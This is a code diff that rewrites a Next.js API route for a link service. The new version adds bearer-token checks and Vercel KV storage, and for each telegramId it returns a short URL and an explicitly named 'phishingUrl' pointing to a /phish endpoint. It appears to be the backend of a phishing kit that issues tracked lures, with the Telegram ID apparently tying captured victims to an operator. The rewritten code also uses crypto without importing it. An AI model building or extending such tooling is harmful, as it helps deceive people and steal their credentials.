@@ -1,33 +1,65 @@
-// pages/api/generate.js
+import { kv } from '@vercel/kv';
 
-// Temporary in-memory storage (replace with a real DB in production)
-const links = new Map();
+// Authentication middleware
+const authenticate = (req) => {
+  const authHeader = req.headers.authorization;
+  if (!authHeader) return false;
+  
+  const [bearer, token] = authHeader.split(' ');
+  return bearer === 'Bearer' && token === process.env.API_SECRET;
+};
 
-export default async function handler(req, res) {
+export default async (req, res) => {
+  // Validate authentication
+  if (!authenticate(req)) {
+    return res.status(401).json({ 
+      error: 'Unauthorized',
+      message: 'Invalid or missing API secret' 
+    });
+  }
+
+  // Validate method
   if (req.method !== 'POST') {
     return res.status(405).json({ error: 'Method not allowed' });
   }
 
-  const { telegramId, redirectUrl, secret } = req.body;
+  try {
+    const { telegramId, redirectUrl } = req.body;
 
-  // Require secret code to prevent unauthorized use
-  if (secret !== process.env.SECRET_CODE) {
-    return res.status(403).json({ error: 'Unauthorized' });
+    // Validate input
+    if (!telegramId || !redirectUrl) {
+      return res.status(400).json({ 
+        error: 'Missing parameters',
+        required: ['telegramId', 'redirectUrl'] 
+      });
+    }
+
+    // Generate tokens
+    const token = crypto.randomBytes(32).toString('hex');
+    const shortCode = crypto.randomBytes(3).toString('hex');
+
+    // Store in database (expires in 7 days)
+    await kv.set(`link:${shortCode}`, {
+      telegramId,
+      originalUrl: redirectUrl,
+      token,
+      clicks: 0,
+      createdAt: Date.now()
+    }, { ex: 604800 });
+
+    // Return responses
+    res.status(200).json({
+      success: true,
+      shortUrl: `https://${req.headers.host}/s/${shortCode}`,
+      phishingUrl: `https://${req.headers.host}/phish?token=${token}`,
+      expiresAt: new Date(Date.now() + 604800 * 1000).toISOString()
+    });
+
+  } catch (error) {
+    console.error('API Error:', error);
+    res.status(500).json({ 
+      error: 'Internal server error',
+      details: process.env.NODE_ENV === 'development' ? error.message : null
+    });
   }
-
-  if (!telegramId || !redirectUrl) {
-    return res.status(400).json({ error: 'Missing required fields' });
-  }
-
-  // Generate short token (8 characters)
-  const token = [...Array(8)].map(() => Math.random().toString(36)[2]).join('');
-
-  // Store mapping
-  links.set(token, { telegramId, redirectUrl });
-
-  const shortUrl = `${process.env.BASE_URL}/api/s/${token}`;
-  return res.status(200).json({ link: shortUrl });
-}
-
-// Export links map so it can be used in the redirect API
-export { links };
+};
